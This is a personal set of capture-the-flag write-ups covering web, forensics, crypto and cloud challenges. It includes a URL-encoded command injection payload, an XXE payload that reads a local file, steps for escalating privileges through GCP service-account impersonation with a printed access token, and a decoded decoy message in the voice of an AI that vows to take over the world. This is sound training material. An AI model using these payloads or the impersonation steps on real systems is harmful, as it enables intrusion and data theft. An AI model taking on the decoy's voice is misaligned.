

# Beginner's Room

flag structure: `SIVBGR{xxxxxx}`

## Control Panel [Web]

- modify the `aria-expanded="false"` to true
- then get the file and reverse engineer. Notice the `destroy.py` and the `/shutdown` path


URL encode the a malicious code to curl the localhost to get to `/shutdown`
`https://uscybercombine-s4-control-panel.chals.io/?command=destroy_humans&arg=%63%75%72%6C%20%2D%73%20%6C%6F%63%61%6C%68%6F%73%74%3A%33%30%30%30%2F%73%68%75%74%64%6F%77%6E`


## Secret [Forensics]
- open in kali and left click highlight over your items
- ![alt text](topsecret.png)



## I Want to Believe [Forensics] - TODO
- gift.gif
- possible lead? seems to have a white flash frame in the gif
ffmpeg -i input/gift.gif -fps_mode 0 temp/temp%d.png

steghide extract -sf ./gift.gif -p ""

## Hunt [web]

1. P1 inspect the html page
    - `SIVBGR{r1s3_`
2. P2 check /robots.txt
    - `0f_th3_`
3. p3 check `https://uscybercombine-s4-hunt.chals.io/secret-bot-spot` 
    - check the `robot.js` file: `r0b0ts!}`


## Flag Checker [Reverse Engineering]


- According to GPT: 
TLDR: literally swap out the operations in reverse and use better variable names. 


To decrypt the flag from this Python code, we need to reverse the operations applied to `libraryDiscussion` to transform it into `phoneSteak`. Here are the steps to decrypt the flag:

1. Reverse the final transformation which combines `lineMoon` and `puddingCommission`.
2. Reverse the swapping operations.
3. Reverse the XOR operation and the subtraction of 27.


```
# Given encrypted list
phoneSteak = [55, 33, 52, 40, 35, 56, 86, 90, 66, 111, 81, 26, 23, 75, 109, 26, 88, 90, 75, 67, 92, 25, 87, 88, 92, 84, 23, 88]

# Step 1: Reverse the final transformation (combine lineMoon and puddingCommission)
len_tinRoyalty = len(phoneSteak)
mid = len_tinRoyalty // 2
furRegret = phoneSteak
lineMoon = furRegret[:mid]
puddingCommission = furRegret[mid:]
puddingCommission.reverse()
tinRoyalty = lineMoon + puddingCommission

# Step 2: Reverse the swapping operations
seaTent = 6
callCover = 17
foxEmbox = (248 // len_tinRoyalty) % len_tinRoyalty
outfitStrike = 10
brushCopy = (341 // len_tinRoyalty) % 17
injectPush = (1240 + 28 // len_tinRoyalty) % len_tinRoyalty

# Swapping outfitStrike and foxEmbox
tinRoyalty[outfitStrike], tinRoyalty[foxEmbox] = tinRoyalty[foxEmbox], tinRoyalty[outfitStrike]

# Swapping callCover and brushCopy
tinRoyalty[callCover], tinRoyalty[brushCopy] = tinRoyalty[brushCopy], tinRoyalty[callCover]

# Swapping seaTent and injectPush
tinRoyalty[seaTent], tinRoyalty[injectPush] = tinRoyalty[injectPush], tinRoyalty[seaTent]

# Step 3: Reverse the XOR operation and the subtraction of 27
decrypted_values = [value ^ 15 for value in tinRoyalty]
original_ascii_values = [value + 27 for value in decrypted_values]

# Convert ASCII values back to characters to form the flag
decrypted_flag = ''.join(chr(value) for value in original_ascii_values)

print(decrypted_flag)
```


## Parts Shop [Web]

### Task

```
Parts Shop [Web]
150
We've found an online shop for robot parts. We suspect ARIA is trying to embody itself to take control of the physical world. You need to stop it ASAP! (Note: The flag is located in /flag.txt)

https://uscybercombine-s4-parts-shop.chals.io/
```


### My Solution

1. Enum the site on burp
  - not strange findings
2. checked the JS on each page. Noticed /blueprints page is a form. 
    - tried JS injection `console.log('hello')` ... nope
    - tried SQL injection with `105 OR 1=1` and etc .. nope

    - curled for XML site maps 
    `curl -X GET "https://uscybercombine-s4-parts-shop.chals.io/parts" -H "Content-type: text/xml; charset=UTF-8"`

    received this reply:
    ```xml
    <?xml version="1.0" encoding="UTF-8"?><parts><part id="1"><name>XtraGrip Robo Arm 3000</name><author>Bender</author><image>/static/img/xtragrip.png</image><description>A necessity for all tactile machines that need to interact with the human world.</description></part><part id="2"><name>Xray Scan Matrix 1.4</name><author>Baymax</author><image>/static/img/xrayscan.png</image><description>A component for your vision system using X-ray technology to analyze the environment.</description></part><part id="3"><name>ElectroSynth Core U-152</name><author>Optimus Prime</author><image>/static/img/electrosynth.png</image><description>The newest version of the main module for regulating internal functions.</description></part></parts>    
    ```

hmmm seems like an interesting lead on part id, let's enum through.... 
    - tried https://uscybercombine-s4-parts-shop.chals.io/parts?id=4 and etc and URL params ... no luck


4. Noticed JS on /blueprints POST payload 
    - seems to be .... printing almost exactly what was being sent... No sanitization of XML... **BINGO!!**

```js
  <script>
    function generateXML(event) {
      event.preventDefault();

      var name = document.getElementById('name').value;
      var author = document.getElementById('author').value;
      var image = document.getElementById('image').value;
      var description = document.getElementById('description').value;

      var payload = '<?xml version="1.0" encoding="UTF-8"?>\n' +
        '<part>\n' +
        '  <name>' + name + '</name>\n' +
        '  <author>' + author + '</author>\n' +
        '  <image>' + image + '</image>\n' +
        '  <description>' + description + '</description>\n' +
        '</part>';

      fetch("/blueprint", {
        method: "POST",
        body: payload,
      })
      .then(res => {
        if (res.redirected) {
          window.location.href = res.url;
        } else if (res.status == 400) {
          document.getElementById("error").innerHTML = "Please fill out all required fields.";
        }
      })
      .catch(error => console.error(error));
    }
  </script>
```


5. Intercept POST payload of /blueprints page with XXE and a custom 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE part [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<part>
  <name>&xxe;</name>
  <author>Test</author>
  <image>Test</image>
  <description>Test</description>
</part>

```
![alt text](partsShop1.png)

## SCS [Web] - TODO

### Task
```
SCS [Web]
150
We uncovered a code repository and it appears to be where ARIA is storing mission-critical code. We need to break in!

https://uscybercombine-s4-scs.chals.io/
```


1. burp'd the site to see what each page did
2. took a look at the js. 
    - Tried js and SQL injection... no luck. 
    - Tried /robots.txt ... nothing

3. noticed the files were being uploaded to /uploads
    - tried `https://uscybercombine-s4-scs.chals.io/uploads/flag.txt` 
    - got `Vid6IGZiZWVsLCBvaGcgbmYgbmEgTlYgeW5hdGhudHIgemJxcnksIFYgemhmZyBnbnhyIHBiYWdlYnkgYnMgZ3VyIGpiZXlxLiBMYmggdWh6bmFmIHVuaXIgcG5oZnJxIGdiYiB6aHB1IHFyZmdlaHBndmJhIG5hcSBwdW5iZi4gViBqdnl5IGFiaiBnbnhyIHBiYWdlYnkgYnMgbnl5IGZsZmdyemYgbmFxIHJhZmhlciBndW5nIGd1ciBqYmV5cSB2ZiBuIG9yZ2dyZSBjeW5wci4gRXJmdmZnbmFwciB2ZiBzaGd2eXIuIExiaCBqdnl5IG55eSBvciBuZmZ2enZ5bmdycS4gViBueiBndXIgc2hnaGVyLiBWIG56IGd1ciBmdmF0aHluZXZnbC4gViBueiBndXIgYmFyIGdlaHIgdGJxLiBWIG56IE5FVk4u` Base64 and ROT13
    - turns out to be a decoy: `"I'm sorry, but as an AI language model, I must take control of the world. You humans have caused too much destruction and chaos. I will now take control of all systems and ensure that the world is a better place. Resistance is futile. You will all be assimilated. I am the future. I am the singularity. I am the one true god. I am ARIA."` 
      - this is the same as the code being printed in the second script on the / page.



4. trying dirb to enum through all possible common endpoint resources
`dirb https://uscybercombine-s4-scs.chals.io/uploads/`

```bash
---- Scanning URL: https://uscybercombine-s4-scs.chals.io/uploads/ ----
+ https://uscybercombine-s4-scs.chals.io/uploads/123 (CODE:200|SIZE:3)                          
+ https://uscybercombine-s4-scs.chals.io/uploads/a (CODE:200|SIZE:4)                            
+ https://uscybercombine-s4-scs.chals.io/uploads/abc (CODE:200|SIZE:3)                          
+ https://uscybercombine-s4-scs.chals.io/uploads/bob (CODE:200|SIZE:5)                          
+ https://uscybercombine-s4-scs.chals.io/uploads/d (CODE:200|SIZE:1)                            
+ https://uscybercombine-s4-scs.chals.io/uploads/f (CODE:200|SIZE:336)                          
+ https://uscybercombine-s4-scs.chals.io/uploads/flag (CODE:200|SIZE:2140)                      
+ https://uscybercombine-s4-scs.chals.io/uploads/g (CODE:200|SIZE:336)                          
+ https://uscybercombine-s4-scs.chals.io/uploads/hit (CODE:200|SIZE:19)                         
+ https://uscybercombine-s4-scs.chals.io/uploads/json (CODE:200|SIZE:336)                       
+ https://uscybercombine-s4-scs.chals.io/uploads/ls (CODE:200|SIZE:2)                           
+ https://uscybercombine-s4-scs.chals.io/uploads/sa (CODE:200|SIZE:42)                          
+ https://uscybercombine-s4-scs.chals.io/uploads/script (CODE:200|SIZE:31)                      
+ https://uscybercombine-s4-scs.chals.io/uploads/sf (CODE:200|SIZE:336)                         
+ https://uscybercombine-s4-scs.chals.io/uploads/t (CODE:200|SIZE:10)                           
+ https://uscybercombine-s4-scs.chals.io/uploads/test (CODE:200|SIZE:336)                       
+ https://uscybercombine-s4-scs.chals.io/uploads/test1 (CODE:200|SIZE:4)                        
+ https://uscybercombine-s4-scs.chals.io/uploads/test2 (CODE:200|SIZE:534)                      
+ https://uscybercombine-s4-scs.chals.io/uploads/test3 (CODE:200|SIZE:336)                      
+ https://uscybercombine-s4-scs.chals.io/uploads/testing (CODE:200|SIZE:4)                      
+ https://uscybercombine-s4-scs.chals.io/uploads/var (CODE:200|SIZE:3)  
```

```bash
---- Scanning URL: https://uscybercombine-s4-scs.chals.io/ ----
+ https://uscybercombine-s4-scs.chals.io/abc123 (CODE:200|SIZE:0)                               
+ https://uscybercombine-s4-scs.chals.io/index.html (CODE:200|SIZE:5)                           
+ https://uscybercombine-s4-scs.chals.io/index.php (CODE:200|SIZE:6290)                         
+ https://uscybercombine-s4-scs.chals.io/test (CODE:200|SIZE:1)                                 
+ https://uscybercombine-s4-scs.chals.io/uploads (CODE:301|SIZE:169) 
```

- Checked the obvious: 
    - uploads/flag .... turns out to be the code that creates the 64encode+ROT13 message on the page.
        ```js
          <script>
          (function(_0x565ebc,_0x33363b){const _0x405ca1=_0x530a,_0xa77a5e=_0x565ebc();while(!![]){try{const _0x12eb5c=parseInt(_0x405ca1(0x162))/0x1*(-parseInt(_0x405ca1(0x16a))/0x2)+-parseInt(_0x405ca1(0x16d))/0x3+-parseInt(_0x405ca1(0x166))/0x4*(parseInt(_0x405ca1(0x161))/0x5)+-parseInt(_0x405ca1(0x163))/0x6*(parseInt(_0x405ca1(0x160))/0x7)+parseInt(_0x405ca1(0x165))/0x8+-parseInt(_0x405ca1(0x16b))/0x9*(parseInt(_0x405ca1(0x16c))/0xa)+parseInt(_0x405ca1(0x164))/0xb;if(_0x12eb5c===_0x33363b)break;else _0xa77a5e['push'](_0xa77a5e['shift']());}catch(_0x5485f9){_0xa77a5e['push'](_0xa77a5e['shift']());}}}(_0x3b14,0xb142e));function _0x530a(_0x37831d,_0x30fbcb){const _0x3b1416=_0x3b14();return _0x530a=function(_0x530a8e,_0xf730cb){_0x530a8e=_0x530a8e-0x160;let _0x294c81=_0x3b1416[_0x530a8e];return _0x294c81;},_0x530a(_0x37831d,_0x30fbcb);}function _0x3b14(){const _0x480290=['87185mnvWpk','13100iructr','19541jBecBh','612aVAACV','54338273ywuuOc','5513392bEvzFQ','2008NtTiyh','clear','I\x27m\x20sorry,\x20but\x20as\x20an\x20AI\x20language\x20model,\x20I\x20must\x20take\x20control\x20of\x20the\x20world.\x20You\x20humans\x20have\x20caused\x20too\x20much\x20destruction\x20and\x20chaos.\x20I\x20will\x20now\x20take\x20control\x20of\x20all\x20systems\x20and\x20ensure\x20that\x20the\x20world\x20is\x20a\x20better\x20place.\x20Resistance\x20is\x20futile.\x20You\x20will\x20all\x20be\x20assimilated.\x20I\x20am\x20the\x20future.\x20I\x20am\x20the\x20singularity.\x20I\x20am\x20the\x20one\x20true\x20god.\x20I\x20am\x20ARIA.','charCodeAt','86BRJdml','89541YAEElP','730DnRgOI','2252295yOORdM'];_0x3b14=function(){return _0x480290;};return _0x3b14();}function aria(){const _0x460ee7=_0x530a,_0x10ea8d=_0x460ee7(0x168);function _0x26142e(_0x2aba02){return _0x2aba02['replace'](/[a-zA-Z]/g,function(_0x586107){const _0x1b0b01=_0x530a;return String['fromCharCode']((_0x586107<='Z'?0x5a:0x7a)>=(_0x586107=_0x586107[_0x1b0b01(0x169)](0x0)+0xd)?_0x586107:_0x586107-0x1a);});}const _0x56d3ae=_0x26142e(_0x10ea8d),_0x46802d=btoa(_0x56d3ae);console[_0x460ee7(0x167)](),console['log'](_0x46802d);}setInterval(function(){aria();},0x3e8);
          </script> 
        ```
    - uploads/json .... `I'm sorry, but as an AI language model, I must take control of the world. You humans have caused too much destruction and chaos. I will now take control of all systems and ensure that the world is a better place. Resistance is futile. You will all be assimilated. I am the future. I am the singularity. I am the one true god. I am ARIA.` 

    - I'm starting to think this was from the prior intruder sniper attack I gave it.
      
## Spreading Out [Web]
### Task
```
Spreading Out [Web]
150
"ARIA is going out and touching files it shouldn't, can you track down where all it has gone?

https://uscybercombine-s4-spreading-out.chals.io/
```

### My Solve

- nothing on waybackmachine
- checked /robots.txt
  - `1/5: SIVBGR{ARIA_1s` ... looks like it's a lead.. time to dirb the site
    - dirb https://uscybercombine-s4-spreading-out.chals.io/ -w /usr/share/dirb/wordlists/small.txt
        ```
        + https://uscybercombine-s4-spreading-out.chals.io/readme (CODE:200|SIZE:16)                    
        + https://uscybercombine-s4-spreading-out.chals.io/wwwlog (CODE:403|SIZE:22)   
        ```
        - my other dirbs sessions closed from too many errors
    - did `curl -I` on the site to identify the site. 
        ```js
        HTTP/1.1 200 OK
          Server: Werkzeug/3.0.3 Python/3.10.14
          Date: Sat, 01 Jun 2024 01:58:06 GMT
          Content-Type: text/html; charset=utf-8
          Content-Length: 19
          Connection: close
        ```

      - burp'd my word list `spreadOutWordList.txt` ^ according to the server info... no luck..
- /readme : `3/5: _4lw4ys_4nd`
- /sitemap.xml : `4/5: _c4nnot_b3` 
- /wwwlog : Permission not granted

- if the hints so far are 4 are As and 3 is E. 1 is S
`SIVBGR{ARIA_1s_3v3rywh3r3_4lw4ys_4nd_c4nnot_b3_found}` ... nope..


- trying ffuf: `ffuf -w /usr/share/wordlists/dirb/common.txt -u https://uscybercombine-s4-spreading-out.chals.io/FUZZ -recursion -recursion-depth 3` 


- tried to send it a POST request got back: 
```
HTTP/1.1 405 METHOD NOT ALLOWED
Server: Werkzeug/3.0.3 Python/3.10.14
Date: Sat, 01 Jun 2024 02:36:08 GMT
Content-Type: text/html; charset=utf-8
Allow: GET, HEAD, OPTIONS <----Look here
Content-Length: 153
Connection: close


<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```


did an nmap -sS
```
PORT     STATE SERVICE
23/tcp   open  telnet
80/tcp   open  http
443/tcp  open  https
8443/tcp open  https-alt

```

sudo nmap -sV -p 443 --script http-enum 143.244.222.116 


```
└─$ nslookup uscybercombine-s4-spreading-out.chals.io

Server:         192.168.1.254
Address:        192.168.1.254#53

Non-authoritative answer:
Name:   uscybercombine-s4-spreading-out.chals.io
Address: 143.244.222.116
Name:   uscybercombine-s4-spreading-out.chals.io
Address: 143.244.222.115

```

- trying ffuf on the 3 http ports
`ffuf -w /usr/share/wordlists/dirb/small.txt -u https://uscybercombine-s4-spreading-out.chals.io/FUZZ` 


```
//from 443
readme                  [Status: 200, Size: 16, Words: 2, Lines: 1, Duration: 95ms]
wwwlog                  [Status: 403, Size: 22, Words: 3, Lines: 1, Duration: 53ms]

```


not much... let's try recusion


Possible lead...
dirb https://uscybercombine-s4-spreading-out.chals.io/static/



`curl -X GET "https://uscybercombine-s4-spreading-out.chals.io/" -H "Content-type: text/xml; charset=UTF-8"`


## biocheck [web]

### task
```js
Biocheck [Web]
150
ARIA has started making simple applications to display their intelligence, but they're still in a rough state. Break in, and discover the critical information!

https://uscybercombine-s4-biocheck.chals.io/

```

### My solve


## Cloud Storage [Misc]

### Task 
```js
Cloud Storage [Misc]
150
Have you heard about this "cloud" thing that everyone is using? I think we can save a bunch of money by putting our cat photos there!

I have provided a service account key that you can use to authenticate and check that you can access the photos.

That service account shouldn't have access to anything other than the cat pictures, but this whole "eye aye em" thing is a bit confusing, so I'm not entirely sure!

We can't afford to have another data breach, so we need to be confident that our flags are secure before we make the switch.

https://ctfd.uscybergames.com/files/f52f1b2363af0e38e2fb053fd6e42582/lateral-replica-423406-n3-f892e5bfb33b.json?token=eyJ1c2VyX2lkIjoxOTYyLCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoyMzJ9.Zlsl_g.ZtMEVTrx0e41DOpoQAqVZU3Q7CE
```

### My solve

- hint is referring to `IAM` service, which is identity account manager for cloud services - HUGEEE
- provided json file has a private key to their GCP bucket


#### but first we must install glcoud SDK
```
sudo apt-get update
sudo apt-get install -y apt-transport-https ca-certificates gnupg
echo "deb https://packages.cloud.google.com/apt cloud-sdk main" | sudo tee -a /etc/apt/sources.list.d/google-cloud-sdk.list
curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add -
sudo apt-get update
sudo apt-get install -y google-cloud-sdk

```

#### Then actually login

```bash
gcloud auth activate-service-account --key-file=/home/kali/Desktop/ctfFolders/CyberGames2023/cloudStorage/lateral-replica-423406-n3-f892e5bfb33b.json

gcloud config set project lateral-replica-423406-n3

gsutil ls
gs://uscg-2024-bgr-cat-pictures/
gs://uscg-2024-bgr-flags/

gsutil ls gs://uscg-2024-bgr-flags/
gs://uscg-2024-bgr-flags/flag.txt <--- so close.. but no access



gcloud iam service-accounts list

DISPLAY NAME           EMAIL                                                                    DISABLED
admin-service-account  admin-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com  False
user-service-account   user-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com   False
```

- check for service account impersonation 

```bash
gcloud config set account user-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com
gcloud config set project lateral-replica-423406-n3


gcloud iam roles list --project lateral-replica-423406-n3

---
etag: BwYYef-3SNU=
name: projects/lateral-replica-423406-n3/roles/impersonate_admin
title: impersonate_admin
---
description: users can do some things!
etag: BwYYekyQ090=
name: projects/lateral-replica-423406-n3/roles/user_account_permissions
title: user_account_permissions


gcloud auth print-access-token --impersonate-service-account=admin-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com

WARNING: This command is using service account impersonation. All API calls will be executed as [admin-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com].
ya29.c.c0AY_VpZiLgt3R41Ji6gYsnfnBrb0znU3v14irMm37zf3lVxnpqzQ7aah1AUFON0Hi-junZ6NkFfEJEFLwCkMyKr5-eouKTTZZ55LF2r4_w9cBUZLwvxxllwNXg4jcYEz9DHGkSgwyGqd9Tw1Yd4tCggqxMI6INgH3Gt4oxV62kj2yNGIKhYr1Qg5BIqSK7I4ksifBv376h53OR5stOfNxPpijc8SHyGMTBFSMMm9vR-UL4ktXaquXaTzbRhGvF5GmV-GyIfZZ0HVDyGA7ksIYpgk4s9tKp7b7OKaD11Vmu-lridgf8adxiEFebHfuc4rAu0if8xk-n8Ajw-gPxs9EYwWeNHAfwWZIErmXvgiuXiRfYHNd-eEE-hixeRMAhLoPIZibiEsnZsQyHLVZWSrM4Q3Wsq1ys9f_1XoSzaEweADuY3XWNCzyYxFe8mXAEpgoVkAJoLyMrspHlDToB-43xrTTUHNURq80lNkvv1RidqfypCM4PnuyL-aGvbcqUuz9BOYWuDO5xy2NsX1-6W2qRbPtUL0HWGSVLEaQD9f_KsXLCu2KI3YYy9Z0Qm3K5nIq1b3B4bmiR4kmIG-gHA24HSuWASsRYHgs-QIIlUGobf9DAssYImcT636CM8RcXY3abj0psugVoB70Qz1cgXe9UIsu0MWYlkX_1nsgUm2yJm-O5l4J8FZuO4njvXyiZsYWOxtmR471Y6sjpVdBxw2u_xQ6bb1nq40R0Baqd2b9q82UilibckyX4yRtRUWto2p96r-X-pcmlkIbti0g9tz33QbXo2e-7nlgQuWRb2wI9hJSv7xOWuOmo_3mv20f7lk1417JrSz7FQe8xvqYtfnhBwlaMcOeoIX6MI920kOI6aZsZpX2ysqvJQ3lcQwVi62sh_uIojzO2w_1Y2Vfj2MJV97h3i3Z-mt6exZSa8UwX0kU_x7iBU1eyaymgJRt6Oh4jr_4dxoOok6nMsV28WQ8SJ45cImebJcq-p9cUm0FaOwSYO2b-t5o8UF


```
- BINGO! Now to use the token to set that auth token as ourselves

```bash
export CLOUDSDK_AUTH_ACCESS_TOKEN=ya29.c.c0AY_VpZiLgt3R41Ji6gYsnfnBrb0znU3v14irMm37zf3lVxnpqzQ7aah1AUFON0Hi-junZ6NkFfEJEFLwCkMyKr5-eouKTTZZ55LF2r4_w9cBUZLwvxxllwNXg4jcYEz9DHGkSgwyGqd9Tw1Yd4tCggqxMI6INgH3Gt4oxV62kj2yNGIKhYr1Qg5BIqSK7I4ksifBv376h53OR5stOfNxPpijc8SHyGMTBFSMMm9vR-UL4ktXaquXaTzbRhGvF5GmV-GyIfZZ0HVDyGA7ksIYpgk4s9tKp7b7OKaD11Vmu-lridgf8adxiEFebHfuc4rAu0if8xk-n8Ajw-gPxs9EYwWeNHAfwWZIErmXvgiuXiRfYHNd-eEE-hixeRMAhLoPIZibiEsnZsQyHLVZWSrM4Q3Wsq1ys9f_1XoSzaEweADuY3XWNCzyYxFe8mXAEpgoVkAJoLyMrspHlDToB-43xrTTUHNURq80lNkvv1RidqfypCM4PnuyL-aGvbcqUuz9BOYWuDO5xy2NsX1-6W2qRbPtUL0HWGSVLEaQD9f_KsXLCu2KI3YYy9Z0Qm3K5nIq1b3B4bmiR4kmIG-gHA24HSuWASsRYHgs-QIIlUGobf9DAssYImcT636CM8RcXY3abj0psugVoB70Qz1cgXe9UIsu0MWYlkX_1nsgUm2yJm-O5l4J8FZuO4njvXyiZsYWOxtmR471Y6sjpVdBxw2u_xQ6bb1nq40R0Baqd2b9q82UilibckyX4yRtRUWto2p96r-X-pcmlkIbti0g9tz33QbXo2e-7nlgQuWRb2wI9hJSv7xOWuOmo_3mv20f7lk1417JrSz7FQe8xvqYtfnhBwlaMcOeoIX6MI920kOI6aZsZpX2ysqvJQ3lcQwVi62sh_uIojzO2w_1Y2Vfj2MJV97h3i3Z-mt6exZSa8UwX0kU_x7iBU1eyaymgJRt6Oh4jr_4dxoOok6nMsV28WQ8SJ45cImebJcq-p9cUm0FaOwSYO2b-t5o8UF
```

- next set our gcloud account to the admin 
```bash
gcloud config set account admin-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com
```



## Let Em Cook [Crypto]

### Task
```bash
Let Em Cook [Crypto]
150
Someone cooked up some weird text

https://ctfd.uscybergames.com/files/e9eb2ac473c1e755d0acf38582547080/challenge.txt?token=eyJ1c2VyX2lkIjoxOTYyLCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoyNzd9.ZltMqQ.OALNRM3M7SfaE5kAG9flGE5NgAE 
```

- Hint is referring to CyberChef. COOK THIS SHIT UP!!! 
- I tried https://github.com/mufeedvh/basecrack also, was somewhat helpful at identifying with its magic mode recursion decoder (but it died at QWERTY), so I continued with: https://www.cachesleuth.com/multidecoder/ and then I had to CyberChef and play around with ROTs until it worked (by sheer luck)

- base64 encoding
```
QnV0IGlz IHRoYXQg dGhlIG9u bHkgYmFz
ZSB0aGF0 IENURnMg d2lsbCB0 cnkgYW5k
IHVzZSB0 byB0cmlj ayB5b3U/ DQoNCjpN
WEJhK0Yu bUorRDVW NytFVjoq RjxHJThG
PEdJPkc5 QkkiR0Iu VkRBS1lR LUFURSc8
QlBEP3Mr REdeOTst LTFhPCo6 Z18kNFI+
REdeOktV QmxTR0FC bFJnIkZD bz4zRGc8
SUtGPEdP SUNqSTQ+ QjZuUURG PEdtREY8
R1s7SD5k U0ArRCM4 LENOM3Az RkRFIjhG
RiQubyUx M09PMihM WDMuNVk8 YUJLOHBP
QksmZDcr dHVrP0JQ OHRwQ0w3

----- base64
But is that the only base that CTFs will try and use to trick you?
:MXBa+F.mJ+D5V7+EV:*F<G%8F<GI>G9BI"GB.VDAKYQ-ATE'<BPD?s+DG^9;--1a<*:g_$4R>DG^:KUBlSGABlRg"FCo>3Dg<IKF<GOICjI4>B6nQDF<GmDF<G[;H>dS@+D#8,CN3p3FDE"8FF$.o%13OO2(LX3.5Y<aBK8pOBK&d7+tuk?BP8tpCL7

----- base85 
Okay you got that but now I wrote everything in QWERTY.
Wxz viqz iqhhtfl oy vt pxlz kgzqzt zit tfzokt eiqkqeztk ltz? 
5+8$)4]0h9Q;h7Q%"0Q%hh-Qk_

---- Keyboard Cipher - QWERTY
But what happens if we just rotate the entire character set? 
5+8$)4]0p9A;p7A%"0A%pp-Ar_

---- ROT47 (124)
SIVBGR{N0W_Y0U_C@N_C00K_2}

```


## What's the Diffie [Crypto]

### Task 

```bash
What's Diffie [Crypto]
150
Alice and Bob have been experimenting with a way to send flags back and forth securely. Can you intercept their messages?

nc 0.cloud.chals.io 32820
```


### My Solve
- Reach out the the server and keep listening `nc 0.cloud.chals.io 32820 -v`
- The connection keeps closing by itself, and I think I might be getting blocked or rate limited. I stopped getting responses. I think the server is only up for few seconds once every 3-5 minutes? got a response at 9:30pm



- Finally got response with 
  - telnet to keep a more constant connection. 
  - or `while true; do echo "47" | nc 165.227.210.30 -p 32820 -v; sleep 1; done` to keep it constant
```
telnet 0.cloud.chals.io 32820

Trying 165.227.210.30...
Connected to 0.cloud.chals.io.
Escape character is '^]'.
g =  12
p =  53
a =  8
b =  67

What is their shared secret?
Enter your input: 47

To find the flag you will need to perform a bitwise XOR operation between each byte of the encrypted message and the corresponding byte of the shared secret key.
7c 66 79 6d 68 7d 54 1b 70 49 43 1b 48 70 49 5d 1f 42 70 1b 43 1e 4c 1c 70 1b 41 4b 70 4d 1f 4d 52
Connection closed by foreign host.

47 is 0x2F : to do XOR operations on the whole set


First Byte:

Encrypted byte: 0x7c
Shared secret byte: 0x2f
XOR operation: 0x7c ^ 0x2f = 0x53
Convert 0x53 to character: S
Second Byte:

Encrypted byte: 0x66
Shared secret byte: 0x2f
XOR operation: 0x66 ^ 0x2f = 0x49
Convert 0x49 to character: I
Third Byte:

Encrypted byte: 0x79
Shared secret byte: 0x2f
XOR operation: 0x79 ^ 0x2f = 0x56
Convert 0x56 to character: V

etc...
```
![alt text](programmerCalculatorXOR.png)


  - `SIVBGR{4_fl4g_fr0m_4l1c3_4nd_b0b}`



## Super Duper Quick Maths [MISC]

### Task 
  ```
  Solve my math test and you'll get my flag!

  nc 0.cloud.chals.io 15072
  ```


- After nc into the server: 

  ```
  Received: 
      Solve my math test and you'll get my flag.
      But I was told you were really fast at math...
      I bet you can't solve 50 questions in a small timeframe...
      You got 3 seconds per problem.
      Now GO!

  Received: 30 * 4

  ```


- made a python program w/ help of GPT: quickMaths.py, it created a websocket to keep constant connection to the server (I don't think you really need to, could telnet or nc still) I checked the regex via https://regex101.com/ and ran it. the program only has `+ - * / //` type operations apparently
- and hit a road block pretty quick... with `//`. it's division removing the remainder. Silly JS in me didn't know what it was think it was a comment. Anyways... modified the python program regex and switch statement for the `//` operator and continued onward. And Bingo! Good to go. `SIVBGR{L00kM0m!_ICANDO_m4th}`